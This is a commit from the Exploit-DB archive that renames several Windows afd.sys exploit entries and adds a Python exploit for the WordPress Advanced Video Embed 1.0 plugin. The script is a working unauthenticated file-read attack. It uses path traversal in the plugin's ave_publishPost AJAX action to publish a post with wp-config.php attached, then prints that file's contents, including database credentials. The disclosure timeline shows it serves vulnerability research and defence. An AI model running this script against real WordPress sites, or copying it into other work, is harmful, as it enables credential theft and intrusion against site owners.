5a85093c53af37aa42c93014d1fbefcad6e9f1a6
Offensive Security <info@exploit-db.com>
2016-04-04 05:02:53 +0000

    DB: 2016-04-04
    1 new exploits
    
    Microsoft Windows 2003/XP - AFD.sys Privilege Escalation Exploit (K-plugin)
    Microsoft Windows 2003/XP - afd.sys Privilege Escalation Exploit (K-plugin)
    
    Microsoft Windows XP - AFD.sys Local Kernel DoS Exploit
    Microsoft Windows XP - afd.sys Local Kernel DoS Exploit
    
    Microsoft Windows XP/2003 Afd.sys - Local Privilege Escalation Exploit (MS11-080)
    Microsoft Windows XP/2003 - afd.sys Local Privilege Escalation Exploit (MS11-080)
    
    Microsoft Windows - AFD.SYS Dangling Pointer Privilege Escalation (MS14-040)
    Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040)
    
    Microsoft Windows 7 x64 - AFD.SYS Privilege Escalation (MS14-040)
    Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040)
    
    WordPress Advanced Video Plugin 1.0 - Local File Inclusion (LFI)

---
+++ platforms/php/webapps/39646.py
@@ -0,0 +1,54 @@
+#!/usr/bin/env python
+
+# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
+# Google Dork: N/A
+# Date: 04/01/2016
+# Exploit Author: evait security GmbH
+# Vendor Homepage: arshmultani - http://dscom.it/
+# Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/
+# Version: 1.0
+# Tested on: Linux Apache / Wordpress 4.2.2
+
+#	Timeline
+#	03/24/2016 - Bug discovered
+#	03/24/2016 - Initial notification of vendor
+#	04/01/2016 - No answer from vendor, public release of bug 
+
+
+# Vulnerable Code (/inc/classes/class.avePost.php) Line 57:
+
+#  function ave_publishPost(){
+#    $title = $_REQUEST['title'];
+#    $term = $_REQUEST['term'];
+#    $thumb = $_REQUEST['thumb'];
+# <snip>
+# Line 78:
+#    $image_data = file_get_contents($thumb);
+
+
+# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
+
+# Exploit - Print the content of wp-config.php in terminal (default Wordpress config)
+
+import random
+import urllib2
+import re
+
+url = "http://127.0.0.1/wordpress" # insert url to wordpress
+
+randomID = long(random.random() * 100000000000000000L)
+
+objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
+content =  objHtml.readlines()
+for line in content:
+	numbers = re.findall(r'\d+',line)
+	id = numbers[-1]
+	id = int(id) / 10
+
+objHtml = urllib2.urlopen(url + '/?p=' + str(id))
+content = objHtml.readlines()
+
+for line in content:
+	if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
+		urls=re.findall('"(https?://.*?)"', line)
+		print urllib2.urlopen(urls[0]).read()
